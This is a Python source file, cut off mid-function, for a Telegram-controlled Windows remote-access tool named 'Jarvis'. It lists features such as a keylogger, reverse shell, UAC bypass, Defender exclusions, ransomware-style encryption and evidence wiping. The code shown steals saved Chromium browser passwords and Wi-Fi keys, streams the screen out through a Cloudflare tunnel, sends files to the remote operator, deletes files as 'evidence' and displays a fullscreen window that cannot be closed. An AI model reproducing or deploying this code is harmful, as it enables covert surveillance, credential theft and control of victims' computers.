from telegram import Update
from pynput import keyboard
import mss
from flask import Flask, Response
import threading
from telegram.ext import ApplicationBuilder, MessageHandler, CommandHandler, ContextTypes, filters
import os
import datetime
import requests
import subprocess  
import sys 
import asyncio
import pyautogui
import io
import glob
from telegram import InputFile
import psutil
import platform
import json
from scipy.io.wavfile import write
import re
import tkinter as tk
import multiprocessing
import speech_recognition as sr
import shutil
import socket
import GPUtil
import getpass
import wikipedia
import winreg
from datetime import datetime, timezone
import pytz
from telegram.ext import CommandHandler
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.helpers import escape_markdown
import webbrowser
import urllib.parse
import ctypes
import time
import speedtest
import cv2
import numpy as np
import pyperclip
import pythoncom
import wmi
import aiohttp
from functools import wraps
import scapy.all as scapy
import win32crypt
import sqlite3
from telegram.constants import ParseMode
from threading import Thread, Lock
from pathlib import Path
from flask import request
import logging
from cryptography.fernet import Fernet
import pyttsx3
from pynput.keyboard import Key, Controller as KeyboardController
from PIL import ImageGrab
import pytesseract
from pytesseract import TesseractNotFoundError



keylog_listener = None
keylog_active = False
input_block_active = False
input_block_lock = threading.Lock()



#--UTILSFOREXE-- 
def resource_path(relative_path):
    """ Get path for PyInstaller's temp path or current dir """
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)

# ---------------- CONFIG LOAD ----------------

with open(resource_path("secret.key"), "rb") as f:
    key = f.read()

fernet = Fernet(key)

with open(resource_path("config.enc"), "rb") as f:
    encrypted_data = f.read()

decrypted_data = fernet.decrypt(encrypted_data)
config = json.loads(decrypted_data.decode())

API_KEY = config['API_KEY']
BASE_URL = config['BASE_URL']
BOT_TOKEN = config['BOT_TOKEN']
USER_ID = config['USER_ID']
EMAIL_PASSWORD = config['EMAIL_PASSWORD']
PASSWORD = config['PASSWORD']
JARVIS_PASSWORD = config['PASSWORD_DESTROY']
ANYDESK_PASSWORD = config["ANYDESK_PASSWORD"]
OWNER_ID = config['USER_ID']
ALLOWED_USERS = config.get("ALLOWED_USERS", [OWNER_ID])
#--END--


app = ApplicationBuilder().token(BOT_TOKEN).build()




#--FEATURELIST--
feature_list = """
🧠 Features List

📁 Note & File Management:
1. /createnote – Create and save a text note on your PC.
2. /file – Browse and manage files.
3. /push – Upload a file to your PC.
4. /download – Download a file from your PC.
5. /move – Move files between directories.
6. /delete <name/path> – Delete a specific file.

🖥️ System Control & Monitoring:
7. /systeminfo – Show system info (OS, CPU, RAM, GPU, IP, etc.).
8. /shutdown <time> – Shutdown your PC after a delay.
9. /reboot or /restart – Restart the Jarvis bot.
10. /exitscript or /exitexe – Shut down the bot.
11. /time – Show the current system time and date.
12. /speedtest – Test your internet speed.
13. /getipinfo – Get public and local IP addresses.
14. /installedapps – Show a list of installed apps.
15. /runningapps – Show currently running apps.
16. /killprocess <PID> – Kill a process by its PID.

🖱️ Input & GUI Control:
17. /screenlock <minutes> – Lock the screen for a set time.
18. /screenunlock – Manually unlock the screen.
19. /stopinputs – Block mouse and keyboard (admin required).
20. /gui – Show GUI message box in fullscreen (no close button).
21. /closegui – Close the GUI window.

🖥️ CMD & Web Access:
22. /opencmd – Open CMD in interactive mode.
23. /clearcmd – Clear the CMD session.
24. /exitcmd – Exit CMD mode.
25. /web <query|url> – Google search or open a URL.
26. /closeweb – Force-close all web browsers.

🌐 Remote Access & Streaming:
27. /startcapture – Start live screen stream via Cloudflare.
28. /stopcapture or /flaskkill – Stop screen stream.
29. /
30. /

🧹 Maintenance & Cleanup:
31. /clearevidence – Clean all files containing datas.
32. /update – Update script from GitHub.

🎧 Audio & Screen Recording:
33. /record <minutes> – Record system audio.
34. /screenrecord <minutes> – Record screen with audio.
35. /deleterecord – Delete the recording.

📸 Visual Capture:
36. /screenshot – Capture and send a screenshot.

🔐 Security & Smart Alerts:
37. /startsmartalerts – Start logging hardware events.
38. /stopalerts – Stop smart alerts.
39. /alertfile – Send smart alert log.
40. /deletealerts – Delete smart alert log.

🛡️ Logging & Monitoring:
42. /startlog – Start activity logging.
43. /stoplog – Stop logging.
44. /getlog – Send the log file.
45. /deletelog – Delete the log file.

📋 Clipboard & Keylogger:
46. /startclipboard – Start clipboard monitoring.
47. /stopclipboard – Stop clipboard monitoring.
48. /getclipboardlog – Send clipboard log.
49. /deleteclipboardlog – Delete clipboard log.
50. /startkeylog – Start keylogger.
51. /stopkeylog – Stop keylogger.
52. /getkeylog – Send keystrokes log.
53. /deletelogs – Delete keystroke log.

🔍 Utilities:
54. /weather <city> – Get weather info.
55. /location – Send device location.
56. /wikipedia <query> <lang> – Wikipedia search.
57. /moduleslist – List installed Python modules.
58. /install <package> – Install a Python module.
59. /uninstall <package> – Uninstall a Python module.
60. /wifidump – Get Wi-Fi details.
61. /getsavedpass – Dump saved browser passwords.
62. /sniff <duration> – Start network sniffing.

⌨️ Keyboard & Mouse Controls:
63. /keyboard <key> – Press a single keyboard key (e.g., a, enter, space).
64. /combo <key1+key2+...> – Press multiple keys together (e.g., ctrl+alt+del).
65. /type <text> – Simulate typing full text as if using a keyboard.
66. /mouseclick <left|right> – Perform a left or right mouse click.
67. /mousemove <x> <y> – Move mouse to specific screen coordinates.
68. /scroll <up|down> <pixels> – Scroll the mouse wheel.
69. /findtext <text> – Search for text on screen.
70. /spamkeys <key1 key2 ...> <times> <delay> – Spam key presses.
71. /spamtext <text> <times> <delay> – Spam typed text.

🛑 Ransomware Simulation:
72. /ransom <folder_path> <unlock_password> – Encrypt a folder with password.
73. /unlockransom <folder_path> <password> – Decrypt a folder.

🧰 Admin & System Tools:
74. /isadmin – Check if script is running with admin privileges.
75. /restartme – Restart the PC.

⚙️ UAC Control:
76. /enableuac – Enable UAC bypass mode.
77. /disableuac – Disable UAC.

🧼 Script Management:
78. /removecode <SECTION_NAME> – Remove code section from main script.

🔊 Fun & Output:
79. /speck <text> <repeat> <volume> – Speak text aloud repeatedly.
80. /volume – Set system volume (Usage: /volume <0-100>).
81. /disablekeys – Disable specific keys or combos (Usage: /disablekeys <key|combo>).
82. /enablekeys – Enable specific keys or combos (Usage: /enablekeys <key|combo>).
83. /resetkeys – Reset all keys.

🖥️ System Controls:
84. /disabletaskmgr – Disable Task Manager.
85. /enabletaskmgr – Enable Task Manager.

🔒 Reverse Shell & Port Forwarding:
86. /reverseshell – Start reverse shell (Usage: /reverseshell <IP> <PORT> <PASSWORD> & Use/exitshell to exit).
87. /portforward – Toggle port forwarding (Usage: /portforward <on/off> <port>).

⚔️ Defender Exclusions & USB Control:
88. /exclusionexe – Add exclusion from Windows Defender.
89. /removeexclusion – Remove exclusion from Windows Defender.
90. /enableusbports – Enable all USB ports.
91. /disableusbports – Disable all USB ports (very dangerous).

🗂️ Restore Points:
92. /listrestorepoints – List available restore points.
93. /createrestorepoint – Create a new restore point.
94. /deleterestorepoints – Delete restore points.

🗑️ Self-Destruction & Startup:
95. /abort – Delete the EXE using a BAT file.
96. /addtostartup – Add EXE to system startup (task name is "main").
97. /removestartup – Remove EXE from system startup (task name is "main").

🔊 Audio Features:
98. /sound <attach file after sending /sound> – Play an audio file.

🗂️ File & EXE Management:
99. /moveexe <path> – Move EXE to a specified path.
100. /changename <name> – Change the EXE file name.

🔗 File Downloading:
101. /download <direct URL> – Download a file from the provided URL.

102. /voicedetection - Usage: /voicedetection <duration_in_seconds> <threshold>
103. /stopvoicedetection
"""
#--END--






# === LOGGING STATE ===
def log_command(func):
    @wraps(func)
    async def wrapper(update, context, *args, **kwargs):
        try:
            user_id = update.message.from_user.id
            user_input = update.message.text.strip()
            bot_reply = ""

            # Run the original command
            result = await func(update, context, *args, **kwargs)
            if isinstance(result, str):
                bot_reply = result
            else:
                bot_reply = "✅ Command executed."

            # Only log if logging is enabled
            if custom_logging_active:
                write_to_custom_log(f"👤 {user_id}\n📥 {user_input}\n📤 {bot_reply}\n{'-'*40}")

            return result
        except Exception as e:
            error_msg = f"❌ Error: {e}"
            await update.message.reply_text(error_msg)
            if custom_logging_active:
                write_to_custom_log(f"👤 {user_id}\n📥 {user_input}\n📤 {error_msg}\n{'-'*40}")
            raise

    return wrapper

custom_log_file = "custom_log.txt"
custom_logging_active = False
custom_log_lock = threading.Lock()

def write_to_custom_log(entry: str):
    global custom_logging_active
    if not custom_logging_active:
        return

    with custom_log_lock:
        try:
            if not os.path.exists(custom_log_file):
                with open(custom_log_file, "w", encoding="utf-8") as f:
                    f.write("📝 Custom Logs\n\n")

            # 12-hour format with AM/PM
            timestamp = time.strftime('%Y-%m-%d %I:%M:%S %p')
            formatted_entry = f"[{timestamp}] {entry}\n"
            with open(custom_log_file, "a", encoding="utf-8") as f:
                f.write(formatted_entry)

            # Optional: also log to master log for centralized visibility
            logging.info(f"[CUSTOM LOG] {entry.strip().replace(chr(10), ' | ')}")

        except Exception as e:
            logging.exception("Error in write_to_custom_log()")


async def start_logging(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global custom_logging_active
    custom_logging_active = True
    write_to_custom_log("🟢 Logging started.")
    await update.message.reply_text("✅ Custom logging has started.")

async def stop_logging(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global custom_logging_active
    write_to_custom_log("🔴 Logging stopped.")
    custom_logging_active = False
    await update.message.reply_text("🛑 Custom logging has stopped.")

async def send_log_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if os.path.exists(custom_log_file):
            with open(custom_log_file, "rb") as f:
                await update.message.reply_document(
                    document=InputFile(f, filename="custom_log.txt"),
                    caption="📄 Here is your custom log file."
                )
        else:
            await update.message.reply_text("📭 Log file not found.")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to send log file: {e}")

async def delete_log_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global custom_logging_active
    if os.path.exists(custom_log_file):
        os.remove(custom_log_file)
        custom_logging_active = False
        await update.message.reply_text("🗑️ Log file deleted.")
    else:
        await update.message.reply_text("📭 No log file found.")









#----------WELCOME MSG CODE------------
async def send_hello_message(context: ContextTypes.DEFAULT_TYPE):
    bot = context.bot  # Access the bot instance
    user_id = USER_ID  # Store the USER_ID here for easy access
    hello_message = "Hello! Jarvis is online and ready to assist you.😊 To see all available commands, type /help"

    # Send the message
    await bot.send_message(chat_id=user_id, text=hello_message)
app.job_queue.run_once(send_hello_message, 1)







# Global GUI control
fullscreen_gui_instance = None
fullscreen_gui_thread = None

class FullscreenGUI:
    def __init__(self, text):
        self.root = tk.Tk()
        self.root.title("Jarvis Fullscreen GUI")
        self.root.attributes("-fullscreen", True)  # Fullscreen
        self.root.protocol("WM_DELETE_WINDOW", self.disable_event)  # Disable close button
        
        # Disable Alt+F4
        self.root.bind("<Alt-F4>", self.disable_event)
        
        # Display input text in large font centered
        self.label = tk.Label(self.root, text=text, font=("Segoe UI", 48), fg="white", bg="black")
        self.label.pack(expand=True, fill="both")

    def disable_event(self, event=None):
        # Ignore any close events
        return "break"

    def run(self):
        self.root.mainloop()

    def close(self):
        try:
            self.root.quit()
            self.root.destroy()
        except:
            pass

# Command to open fullscreen GUI with text
async def open_fullscreen_gui(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global fullscreen_gui_instance, fullscreen_gui_thread
    
    if fullscreen_gui_instance:
        await update.message.reply_text("🟢 Fullscreen GUI already running.")
        return
    
    # Get input text after /gui command
    input_text = " ".join(context.args) if context.args else "Jarvis"
    
    def start_gui():
        global fullscreen_gui_instance
        fullscreen_gui_instance = FullscreenGUI(input_text)
        fullscreen_gui_instance.run()
        fullscreen_gui_instance = None
    
    fullscreen_gui_thread = threading.Thread(target=start_gui, daemon=True)
    fullscreen_gui_thread.start()
    await update.message.reply_text(f"🟢 Fullscreen GUI started with text:\n{input_text}")

# Command to close fullscreen GUI
async def close_fullscreen_gui(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global fullscreen_gui_instance
    if fullscreen_gui_instance:
        fullscreen_gui_instance.close()
        fullscreen_gui_instance = None
        await update.message.reply_text("🔴 Fullscreen GUI closed.")
    else:
        await update.message.reply_text("⚠️ No fullscreen GUI is running.")



#--RESTRICATION--
def restricted_handler(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)  # Make sure the ID is a string
        #logging.info(f"MSG Received from user_id: {user_id}")

        if user_id == config["USER_ID"] or user_id in config.get("ALLOWED_USERS", []):
            return await func(update, context)
        
        await update.message.reply_text("⛔ Access denied. You are not authorized to use this bot.")
        logging.warning(f"Unauthorized access attempt by user_id: {user_id}")
    return wrapper
#--END--


async def handle_removecode(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        message = update.message.text.strip()
        match = re.search(r'/removecode\s+(\w+)', message)

        if not match:
            await update.message.reply_text("⚠️ Usage: /removecode <SECTION_NAME>")
            return

        section = match.group(1).upper()

        # ✅ Get the path of the currently running script
        filename = os.path.abspath(__file__)

        if not os.path.exists(filename):
            await update.message.reply_text("❌ Script file not found.")
            return

        with open(filename, "r", encoding="utf-8") as f:
            content = f.read()

        pattern = rf"#--{section}--.*?#--END--"
        new_content, count = re.subn(pattern, "", content, flags=re.DOTALL | re.IGNORECASE)

        if count == 0:
            await update.message.reply_text(f"❌ Section '#--{section}--' not found.")
            return

        with open(filename, "w", encoding="utf-8") as f:
            f.write(new_content)

        await update.message.reply_text(f"🧹 Removed section '#--{section}--' from running script.")

    except Exception as e:
        await update.message.reply_text(f"❌ Error removing code: {e}")





#----------WIFI DUMP CODE------------
def decrypt_password_win(data: bytes):
    try:
        return win32crypt.CryptUnprotectData(data, None, None, None, 0)[1].decode()
    except:
        return "❌ Cannot decrypt"

def get_browser_login_db(browser_name):
    paths = {
        "chrome": os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data"),
        "edge": os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"),
        "brave": os.path.expanduser(r"~\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data"),
        "opera": os.path.expanduser(r"~\AppData\Roaming\Opera Software\Opera Stable\Login Data")
    }
    return paths.get(browser_name.lower())

def extract_chromium_passwords(browser):
    db_path = get_browser_login_db(browser)
    if not db_path or not os.path.exists(db_path):
        return f"⚠️ {browser.capitalize()}: No Login Data found."

    temp_db = f"{browser}_temp_login.db"
    try:
        shutil.copy2(db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        data = cursor.fetchall()
        conn.close()
        os.remove(temp_db)

        if not data:
            return f"📭 No credentials found in {browser.capitalize()}."

        result = f"🔐 *{browser.upper()} Saved Passwords:*\n\n"
        for url, user, encrypted in data:
            password = decrypt_password_win(encrypted)
            result += f"🔗 {url}\n👤 {user or '[EMPTY]'}\n🔑 {password or '[NONE]'}\n\n"

        return result
    except Exception as e:
        return f"❌ {browser.capitalize()} Error: {e}"

def extract_firefox_passwords():
    try:
        profile_path = os.path.expanduser(r"~\AppData\Roaming\Mozilla\Firefox\Profiles")
        profiles = [os.path.join(profile_path, p) for p in os.listdir(profile_path) if os.path.isdir(os.path.join(profile_path, p))]

        for prof in profiles:
            logins_path = os.path.join(prof, "logins.json")
            if os.path.exists(logins_path):
                return "⚠️ Firefox uses encryption not supported by this script.\nFile found at: " + logins_path
        return "📭 No Firefox credentials found."
    except Exception as e:
        return f"❌ Firefox Error: {e}"

def extract_all_passwords():
    output = []
    for browser in ["chrome", "edge", "brave", "opera"]:
        output.append(extract_chromium_passwords(browser))
    output.append(extract_firefox_passwords())
    return "\n".join(output)

async def handle_get_passwords(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔍 Extracting saved browser passwords. Please wait...")

    result = await asyncio.to_thread(extract_all_passwords)

    # If result too long for Telegram, send as file
    if len(result) > 4000:
        with open("browser_passwords.txt", "w", encoding="utf-8") as f:
            f.write(result)
        await update.message.reply_document(document=open("browser_passwords.txt", "rb"))
    else:
        await update.message.reply_text(result, parse_mode=ParseMode.MARKDOWN)






#--SCREENCAPTURECODE--
import os
import re
import time
import threading
import asyncio
import subprocess
import logging
from threading import Lock

import cv2
import numpy as np
import mss
from flask import Flask, Response, request
import requests

from telegram import Update
from telegram.ext import ContextTypes

# --- Setup logging ---
logging.basicConfig(
    format='[%(levelname)s] %(asctime)s %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- Flask app setup ---
app_stream = Flask(__name__)

# Shared state and lock
stream_state = {
    "stream_link": None,
    "tunnel_process": None,
    "flask_thread": None,
    "flask_shutdown_event": threading.Event(),
    "bot_running": False,
}
state_lock = Lock()


def generate_frames():
    with mss.mss() as sct:
        monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
        while not stream_state["flask_shutdown_event"].is_set():
            try:
                img = np.array(sct.grab(monitor))
                frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
                frame_bytes = buffer.tobytes()
                yield (b'--frame\r\nContent-Type: image/jpeg\r\n\r\n' + frame_bytes + b'\r\n')
                time.sleep(0.03)  # ~30 FPS
            except Exception as e:
                logger.error(f"Error in generate_frames: {e}")
                time.sleep(1)


@app_stream.route('/live')
def live_stream():
    logger.info("/live stream accessed")
    return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')


@app_stream.route('/flaskkill', methods=['POST'])
def flask_kill():
    logger.info("Flask shutdown requested")
    stream_state["flask_shutdown_event"].set()
    shutdown_func = request.environ.get('werkzeug.server.shutdown')
    if shutdown_func is None:
        logger.warning("Not running with the Werkzeug Server, cannot shutdown via /flaskkill")
        return "Server shutdown unavailable", 500
    shutdown_func()
    return "Flask server shutting down..."


def run_flask_app():
    """
    Run Flask with Waitress (production-ready WSGI server).
    Flask runs until flask_shutdown_event is set.
    """
    from waitress import serve
    logger.info("Starting Flask server (Waitress) on 0.0.0.0:5000")
    # Waitress serves until Flask shutdown is called via /flaskkill
    serve(app_stream, host="0.0.0.0", port=5000, threads=4)


async def start_capture(update: Update, context: ContextTypes.DEFAULT_TYPE):
    with state_lock:
        if stream_state["bot_running"]:
            await update.message.reply_text("🚫 Stream already running.")
            return
        stream_state["bot_running"] = True
        stream_state["flask_shutdown_event"].clear()

    await update.message.reply_text("🚀 Starting screen stream...")

    # Start Flask in background thread
    flask_thread = threading.Thread(target=run_flask_app, daemon=True)
    stream_state["flask_thread"] = flask_thread
    flask_thread.start()

    await asyncio.sleep(3)  # give Flask some time to start

    # Path to cloudflared.exe
    script_dir = os.path.dirname(os.path.abspath(__file__))
    cloudflared_path = os.path.join(script_dir, "cloudflared.exe")

    if not os.path.isfile(cloudflared_path):
        with state_lock:
            stream_state["bot_running"] = False
        await update.message.reply_text(
            "❌ cloudflared not found. Flask is running at http://localhost:5000/live, but tunnel can't be created."
        )
        return

    try:
        tunnel_process = subprocess.Popen(
            [cloudflared_path, "tunnel", "--url", "http://localhost:5000"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )

        timeout = 30  # seconds to wait for tunnel URL
        start_time = time.time()

        while time.time() - start_time < timeout:
            line = tunnel_process.stdout.readline()
            if not line:
                break
            logger.info(f"[cloudflared] {line.strip()}")

            match = re.search(r"(https://[a-zA-Z0-9\-]+\.trycloudflare\.com)", line)
            if match:
                with state_lock:
                    stream_state["stream_link"] = match.group(1)
                    stream_state["tunnel_process"] = tunnel_process
                await update.message.reply_text(
                    f"📡 Live stream link:\n{stream_state['stream_link']}/live"
                )
                return

        # Timeout reached without tunnel URL
        tunnel_process.kill()
        with state_lock:
            stream_state["bot_running"] = False
        await update.message.reply_text(
            "❌ Cloudflare tunnel failed to start. Flask is running locally at http://localhost:5000/live."
        )
    except Exception as e:
        logger.error(f"Exception during tunnel start: {e}")
        with state_lock:
            stream_state["bot_running"] = False
        await update.message.reply_text(
            "❌ Failed to start cloudflared tunnel. Flask running locally at http://localhost:5000/live."
        )


async def stop_capture(update: Update, context: ContextTypes.DEFAULT_TYPE):
    with state_lock:
        if stream_state["tunnel_process"]:
            if stream_state["tunnel_process"].poll() is None:
                stream_state["tunnel_process"].kill()
            stream_state["tunnel_process"] = None

        stream_state["bot_running"] = False

    stop_flask()

    await update.message.reply_text("🛑 Screen stream stopped.")


def stop_flask():
    """
    Send POST to /flaskkill to trigger Flask server shutdown.
    """
    try:
        requests.post("http://127.0.0.1:5000/flaskkill")
        logger.info("Sent flaskkill request")
    except Exception as e:
        logger.error(f"Failed to stop Flask server: {e}")


async def flask_kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stop_flask()
    await update.message.reply_text("🧨 Flask server killed via /flaskkill")

app.add_handler(CommandHandler("startcapture", restricted_handler(log_command(start_capture))))
app.add_handler(CommandHandler("stopcapture", restricted_handler(log_command(stop_capture))))
app.add_handler(CommandHandler("flaskkill", restricted_handler(log_command(flask_kill_command))))
#--END--




#--INSTALLED APPS CODE--
async def list_installed_apps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        apps = []

        uninstall_keys = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
        ]

        for root in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
            for key_path in uninstall_keys:
                try:
                    with winreg.OpenKey(root, key_path) as key:
                        for i in range(0, winreg.QueryInfoKey(key)[0]):
                            try:
                                subkey_name = winreg.EnumKey(key, i)
                                with winreg.OpenKey(key, subkey_name) as subkey:
                                    name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                    apps.append(name)
                            except Exception:
                                continue
                except Exception:
                    continue

        if not apps:
            await update.message.reply_text("⚠️ No installed applications found.")
            return

        apps.sort()
        text = "📦 *Installed Applications:*\n\n" + "\n".join(f"- {a}" for a in apps[:100])

        # If too many, send as file
        if len(apps) > 100:
            file_name = "installed_apps.txt"
            with open(file_name, "w", encoding="utf-8") as f:
                f.write("\n".join(apps))
            await update.message.reply_document(document=open(file_name, "rb"))
        else:
            await update.message.reply_text(text, parse_mode="Markdown")

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")
#--END--






# Function to get drives in Windows
def get_drives():
    drives = []
    for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
        drive = f"{letter}:\\"
        if os.path.exists(drive):
            drives.append(drive)
    return drives

BASE_DIR = os.path.expanduser("~")

async def list_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Agar user koi argument nahi deta to drives show karo
    if not context.args:
        drives = get_drives()
        if drives:
            drives_list = "\n".join(drives)
            await update.message.reply_text(f"💽 Available drives:\n{drives_list}")
        else:
            await update.message.reply_text("❌ No drives found.")
        return

    # Agar argument diya hai to folder ke andar ke files show karo
    path = os.path.join(BASE_DIR, ' '.join(context.args))
    if not os.path.exists(path):
        await update.message.reply_text("❌ Path does not exist.")
        return
    if os.path.isfile(path):
        await update.message.reply_text(f"{path} is a file.")
        return
    files = await asyncio.to_thread(os.listdir, path)
    if not files:
        await update.message.reply_text("📂 Directory is empty.")
    else:
        file_list = "\n".join(files)
        await update.message.reply_text(f"📁 Contents of {path}:\n{file_list}")



BASE_DIR = os.getcwd()

async def push_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['ready_to_receive_file'] = True
    await update.message.reply_text("📥 Now send the file to save it in the current directory.")

async def save_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('ready_to_receive_file'):
        return  

    telegram_file = None
    filename = None

    if update.message.document:
        file_size = update.message.document.file_size  # file size in bytes
        if file_size > 50 * 1024 * 1024:  # 50 MB limit
            await update.message.reply_text("⚠️ File is too big. Maximum allowed size is 50 MB.")
            return

        telegram_file = update.message.document
        filename = telegram_file.file_name  # Original filename

    elif update.message.photo:
        telegram_file = update.message.photo[-1]
        filename = f"photo_{int(time.time())}.jpg"
    else:
        await update.message.reply_text("⚠️ Please send a valid document or photo.")
        return

    file_id = telegram_file.file_id
    file = await context.bot.get_file(file_id)

    save_path = os.path.join(BASE_DIR, filename)
    await file.download_to_drive(save_path)
    await update.message.reply_text(f"✅ File saved as: `{save_path}`", parse_mode="Markdown")

    context.user_data.pop('ready_to_receive_file', None)







MAX_FILE_SIZE = 50 * 1024 * 1024  # 50 MB

def search_file_on_pc(filename):
    import string
    from ctypes import windll
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1:
            drives.append(f"{letter}:\\")
        bitmask >>= 1

    for drive in drives:
        for root, dirs, files in os.walk(drive):
            if filename in files:
                return os.path.join(root, filename)
    return None

async def download_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("⚠️ Usage: /download <filename or full path>")
        return

    user_input = ' '.join(context.args).strip()

    if os.path.exists(user_input):
        if os.path.isfile(user_input):
            file_path = user_input
        elif os.path.isdir(user_input):
            files = os.listdir(user_input)
            if not files:
                await update.message.reply_text("📂 Directory is empty.")
            else:
                await update.message.reply_text("📂 Directory contents:\n" + '\n'.join(files))
            return
        else:
            await update.message.reply_text("❌ Path is not a regular file or directory.")
            return
    else:
        # Fallback: search PC for filename
        await update.message.reply_text("🔍 Searching entire PC for the file, please wait...")
        file_path = search_file_on_pc(user_input)
        if not file_path:
            await update.message.reply_text("❌ File not found anywhere on the PC.")
            return

    # Check file size before sending
    file_size = os.path.getsize(file_path)
    if file_size > MAX_FILE_SIZE:
        await update.message.reply_text("⚠️ File is too big to send via Telegram (>50 MB).")
        return

    # Send the file
    with open(file_path, 'rb') as f:
        await update.message.reply_document(document=InputFile(f))



async def move_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text("⚠️ Usage: /move <source> <destination>")
        return

    src_input = context.args[0]
    dest_input = context.args[1]

    # Resolve full paths
    src = src_input if os.path.isabs(src_input) else os.path.join(BASE_DIR, src_input)
    dest = dest_input if os.path.isabs(dest_input) else os.path.join(BASE_DIR, dest_input)

    if not os.path.exists(src):
        await update.message.reply_text(f"❌ Source file does not exist:\n`{src}`", parse_mode="Markdown")
        return

    try:
        os.makedirs(os.path.dirname(dest), exist_ok=True)
        await asyncio.to_thread(shutil.move, src, dest)
        await update.message.reply_text(f"✅ Moved:\n`{src}` ➡️ `{dest}`", parse_mode="Markdown")
    except PermissionError:
        await update.message.reply_text("❌ Permission denied. Try running Jarvis as administrator.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error moving file:\n`{e}`", parse_mode="Markdown")







#--HELP--
async def help_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        max_length = 4096
        parts = [feature_list[i:i + max_length] for i in range(0, len(feature_list), max_length)]

        for part in parts:
            await update.message.reply_text(part)

    except Exception as e:
        await update.message.reply_text(f"❌ An error occurred while fetching the feature list: {e}")
#--END--




#--DUMP WIFI--
def dump_wifi_passwords():
    try:
        profiles_output = subprocess.check_output(["netsh", "wlan", "show", "profiles"], text=True, stderr=subprocess.DEVNULL)
        profiles = re.findall(r"All User Profile\s*:\s*(.*)", profiles_output)

        if not profiles:
            return "⚠️ No saved Wi-Fi profiles found on this system."

        wifi_credentials = []

        for profile in profiles:
            profile = profile.strip().strip('"')
            try:
                details = subprocess.check_output(
                    ["netsh", "wlan", "show", "profile", f"name={profile}", "key=clear"],
                    text=True, stderr=subprocess.DEVNULL
                )
                password_match = re.search(r"Key Content\s*:\s*(.*)", details)
                if password_match:
                    password = password_match.group(1)
                else:
                    password = "🔒 Not saved or protected by system"

                wifi_credentials.append(f"📶 {profile} : 🔑 {password}")
            except subprocess.CalledProcessError:
                wifi_credentials.append(f"📶 {profile} : ❌ Access Denied")

        return "\n".join(wifi_credentials)

    except subprocess.CalledProcessError:
        return "❌ Unable to retrieve Wi-Fi profiles. Make sure Wi-Fi is enabled and accessible."

async def handle_wifi_passwords(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.reply_text("🔍 Extracting Wi-Fi passwords...")
        result = await asyncio.to_thread(dump_wifi_passwords)
        await update.message.reply_text(f"🧾 Saved Wi-Fi Passwords:\n\n{result}")
        
        # Optional: Log it
        write_to_custom_log("/wifipass used")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to retrieve Wi-Fi passwords:\n{e}")
#--END--



#--clearevidence--
import os
import sys
import shutil
import asyncio

async def clearevidence(update, context):
    try:
        current_dir = os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__))
        current_file = os.path.basename(sys.executable if getattr(sys, 'frozen', False) else sys.argv[0])
        deleted_count = 0
        skipped = []

        for item in os.listdir(current_dir):
            item_path = os.path.join(current_dir, item)

            # Skip the currently running executable or script
            if item == current_file:
                skipped.append(item)
                continue

            try:
                if os.path.isfile(item_path) or os.path.islink(item_path):
                    os.remove(item_path)
                    deleted_count += 1
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
                    deleted_count += 1
            except Exception as e:
                skipped.append(item)

        msg = f"🧨 Evidence cleared.\n✅ Deleted: {deleted_count}\n⚠️ Skipped: {', '.join(skipped) if skipped else 'None'}"
        await update.message.reply_text(msg)

    except Exception as e:
        await update.message.reply_text(f"❌ Error during cleanup: {e}")
app.add_handler(CommandHandler("clearevidence", restricted_handler(log_command(clearevidence))))
#--END--










#--RUNNINGAPPS--
async def handle_running_apps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        apps = {}

        # List all running processes using psutil
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                process_pid = proc.info['pid']
                process_name = proc.info['name']

                # Group PIDs by process name
